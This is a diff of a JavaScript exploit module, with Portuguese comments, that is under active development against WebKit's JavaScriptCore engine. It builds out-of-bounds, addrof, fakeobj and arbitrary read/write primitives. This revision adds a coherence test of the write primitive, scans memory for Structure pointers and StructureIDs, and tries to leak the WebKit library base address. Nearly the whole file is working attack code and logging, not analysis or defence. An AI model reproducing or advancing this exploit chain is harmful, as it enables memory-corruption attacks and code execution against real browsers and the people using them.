@@ -1,12 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v112 - R72 Fix: Primitive Re-assignment for Scope)
+// js/script3/testArrayBufferVictimCrash.mjs (v113 - R73 Teste de Coerência com JS normal na Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Simplifica a gestão das primitivas 'addrof', 'fakeobj', 'arb_read', 'arb_write'.
-// - Em vez de 'global_' ou 'current_phase5_' prefixes, elas serão re-atribuídas
-//   diretamente após a re-inicialização completa do OOB, garantindo que o código
-//   sempre use as primitivas mais recentes e válidas.
-// - Remove a re-declaração de 'leaker' e das funções read/write dentro do scanner,
-//   usando as funções principais.
+// - Adiciona um teste de coerência na Fase 5:
+//   1. Escreve um valor conhecido numa propriedade do leak_target_obj via arb_write_final_func.
+//   2. Tenta ler o MESMO VALOR dessa propriedade usando acesso JavaScript NORMAL (leak_target_obj.f).
+//   3. Compara o valor lido via JS normal com o valor escrito via primitiva.
+// - Isso determinará se a arb_write_final_func está realmente escrevendo no objeto.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -18,7 +17,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v112_R72_PrimitiveReassignFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v113_R73_CoherenceTest";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -42,7 +41,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Re-atribuição de Primitivas ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Teste de Coerência na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
@@ -98,7 +97,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
-        setupPrimitives(); // Chama a função para configurar as primitivas iniciais
+        setupPrimitives(); 
         logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");
 
         // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
@@ -129,7 +128,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- Reiniciar TODO o ambiente para a Fase 5 ---
         logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
         
-        // Zera as referências antigas para ajudar na coleta de lixo
         confused_array = null;
         victim_array = null;
         leaker = null;
@@ -143,7 +141,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
         logS3("Ambiente OOB re-inicializado com sucesso.", "good");
 
-        // Re-configura as primitivas para o NOVO ambiente OOB
         setupPrimitives(); 
         logS3("Primitivas L/E re-inicializadas com novos objetos (Arrays Literais) e referências no NOVO ambiente OOB.", "good");
 
@@ -169,25 +166,31 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(250); 
 
         // ============================================================================
-        // TESTE DE ESCRITA/LEITURA ARBITRÁRIA NA FASE 5
+        // TESTE DE COERÊNCIA DE L/E NA FASE 5: PRIMITIVA ARB_WRITE COM LEITURA JS NORMAL
         // ============================================================================
-        logS3("--- TESTE DE L/E NA FASE 5: Verificando funcionalidade no novo contexto... ---", "subtest");
-        const test_val_phase5 = new AdvancedInt64(0x5555AAAA, 0xBBBBCCCC);
-        const prop_f_addr_phase5 = leak_target_addr.add(0x10); 
-        logS3(`    (Fase 5 L/E Test) Escrevendo ${test_val_phase5.toString(true)} no endereço ${prop_f_addr_phase5.toString(true)} (prop 'f')...`, "info");
-        
-        arb_write_final_func(prop_f_addr_phase5, test_val_phase5);
-        const read_back_val_phase5 = arb_read_final_func(prop_f_addr_phase5);
-        logS3(`    (Fase 5 L/E Test) Lido de volta: ${read_back_val_phase5.toString(true)}`, "leak");
+        logS3("--- TESTE DE COERÊNCIA (Fase 5): Escrita Arbitrária vs. Leitura JS Normal ---", "subtest");
+        const coherence_test_val = 0xAAAAAAAA; // Valor que esperamos ver em leak_target_obj.f (32-bit)
+        const prop_f_offset = 0x10; // Offset para 'f' em um objeto JS simples
+        const prop_f_addr = leak_target_addr.add(prop_f_offset); 
 
-        if (!read_back_val_phase5.equals(test_val_phase5)) {
-            throw new Error(`FALHA CRÍTICA: Teste de L/E da Fase 5 falhou. Escrito: ${test_val_phase5.toString(true)}, Lido: ${read_back_val_phase5.toString(true)}. A primitiva de L/E não está funcionando corretamente no novo contexto.`);
+        logS3(`    (Coerência) Escrevendo 0x${coherence_test_val.toString(16)} em ${prop_f_addr.toString(true)} via arb_write_final_func (4 bytes)...`, "info");
+        arb_write_final_func(prop_f_addr, coherence_test_val, 4); // Escreve 4 bytes
+
+        await PAUSE_S3(10); // Pequena pausa para garantir a escrita
+
+        logS3(`    (Coerência) Lendo o valor de leak_target_obj.f via JavaScript normal...`, "info");
+        const read_via_js_normal = leak_target_obj.f;
+        logS3(`    (Coerência) Valor lido via JS normal: ${toHex(read_via_js_normal)}`, "leak");
+
+        if (read_via_js_normal !== coherence_test_val) {
+            throw new Error(`FALHA CRÍTICA (COERÊNCIA): Valor escrito via arb_write (${toHex(coherence_test_val)}) NÃO corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) em leak_target_obj.f. Isso indica que a arb_write_final_func não está escrevendo no local esperado ou que há um problema de coerência/cache. DEBUG IMEDIATO NECESSÁRIO.`);
         }
-        logS3("--- TESTE DE L/E NA FASE 5: SUCESSO! A primitiva de L/E está funcional no novo contexto. ---", "good");
-        await PAUSE_S3(50); 
+        logS3("--- TESTE DE COERÊNCIA (Fase 5): SUCESSO! arb_write_final_func está escrevendo no local correto do objeto. ---", "good");
+        await PAUSE_S3(50);
+
 
         // ============================================================================
-        // SCANNER DE OFFSETS (agora usando as primitivas principais)
+        // SCANNER DE OFFSETS (executa se o teste de coerência for bem-sucedido)
         // ============================================================================
         logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do objeto alvo... ---", "subtest");
         let found_structure_ptr = null;
@@ -202,9 +205,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const current_scan_addr = leak_target_addr.add(offset);
             
             // Usar as funções principais de leitura/escrita arbitrária.
-            // O `leaker.obj_prop = null` já está dentro de `arb_read_final_func`,
-            // mas podemos adicioná-lo aqui também para clareza, embora não seja estritamente necessário.
-            // leaker.obj_prop = null; 
+            // arb_read_final_func já lida com leaker.obj_prop = fakeobj_func(addr);
             
             let val_8_bytes = AdvancedInt64.Zero;
             try {
@@ -227,7 +228,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 }
 
                 if (offset % 4 === 0) { 
-                    // leaker.obj_prop = null; // Já feito por arb_read_final_func
                     const val_4_bytes = arb_read_final_func(current_scan_addr, 4); 
                     if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
                         logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
@@ -255,46 +255,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             actual_structure_id = found_structure_id;
             logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
-            // Re-calculando o webkit_base_candidate aqui para garantir que jsobject_put_addr seja válido.
-            // NOTA: jsobject_put_addr ainda não está definido neste ponto. Isso é um erro de lógica.
-            // Precisamos do webkit_base_addr antes de poder usar jsobject_put_addr para calculá-lo.
-            // Para usar o StructureID, precisaremos vazar o webkit_base_addr de outra forma primeiro,
-            // ou assumir que o StructureID é a *primeira* coisa que vazamos e então usamos o ID
-            // para obter o ponteiro da Structure, e só então a vfunc e a base WebKit.
-
-            // Para o fluxo atual, se found_structure_id for usado, teremos que assumir que
-            // o webkit_base_addr já foi vazado por algum outro mecanismo para encontrar a
-            // Structure Table. Como não temos isso, vamos simplificar a lógica de fallback:
-            // SE O STRUCTURE_ID FOR ENCONTRADO, PARA ESTE TESTE, VAMOS CONSIDERAR UM SUCESSO
-            // MAS AINDA PRECISAMOS DO BASE DA WEBKIT PARA O CALCULO DA TABELA DE ESTRUTURAS.
-            // A IMPLEMENTAÇÃO ABAIXO ASSUME QUE webkit_base_candidate_for_struct_table SERÁ VAZADO.
-            // Como webkit_base_addr é o resultado final, não podemos usá-lo aqui.
-            // Isso indica uma dependência cíclica que precisa ser quebrada.
-
-            // Para continuar, VAMOS REMOVER A PARTE DO CALCULO DO WEBKIT_BASE_ADDR AQUI,
-            // E APENAS LOGAR O ID. Se a varredura for bem-sucedida, vamos precisar revisar
-            // como a base da WebKit é vazada em um cenário de StructureID.
-            // Por enquanto, o foco é validar a leitura do ID/Pointer da Structure.
-            
-            // Este bloco será executado SOMENTE se um StructureID for encontrado.
-            // Por ora, vamos simplificar para ver se a leitura do ID é estável.
-            // O cálculo da Structure Table virá *depois* que tivermos uma primitive de leitura/escrita
-            // robusta e um vazamento de base WebKit estável (talvez de um JSFunction ou outro objeto).
-            // A prioridade agora é obter o endereço da Structure (seja direto ou via ID).
-            
-            // A validação de sucesso para o vazamento base da WebKit pode precisar ser adiada
-            // ou ser uma etapa separada se o StructureID for o caminho.
-            
-            //throw new Error(`StructureID ${toHex(actual_structure_id)} encontrado. Próxima etapa: vazar webkit_base_addr e structureTableBase para resolver o ponteiro da Structure.`);
-            
-            // Por agora, se found_structure_id for != 0, assumimos que esta parte do vazamento é um sucesso.
-            // A lógica de vazamento completo da WebKit será ajustada depois de termos
-            // certeza sobre a leitura do StructureID/Pointer.
-            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address para resolver o ponteiro da Structure via tabela.`;
+            // Se o StructureID for encontrado, para este teste, vamos apenas logar e considerar um sucesso para o scanner.
+            // A resolução para o WebKit Base Address via Structure Table exigirá mais passos.
+            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
             final_result.success = true; // Marca como sucesso para o teste do scanner
             final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
-            return final_result; // Retorna aqui para não continuar com o resto do fluxo
-            // Remove o throw new Error aqui para permitir que o teste do scanner seja "bem-sucedido" se encontrar um ID.
+            return final_result; 
 
         } else {
             throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
@@ -302,7 +268,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
 
         // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
-        // (Este bloco só será alcançado se found_structure_ptr for != null)
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         leaker.obj_prop = null; 
         const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr); 
@@ -332,7 +297,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     } finally {
-        // Limpar todas as referências para evitar vazamentos e problemas de GC
         confused_array = null;
         victim_array = null;
         leaker = null;
@@ -341,8 +305,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_read_final_func = null;
         arb_write_final_func = null;
         
-        // As variáveis com 'current_phase5_' não são acessíveis aqui no finally se forem locais ao try,
-        // então não precisam de limpeza extra aqui.
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
     }
 
@@ -357,6 +319,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Scanner with Per-Iteration Leaker)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Coherence Test)' }
     };
 }
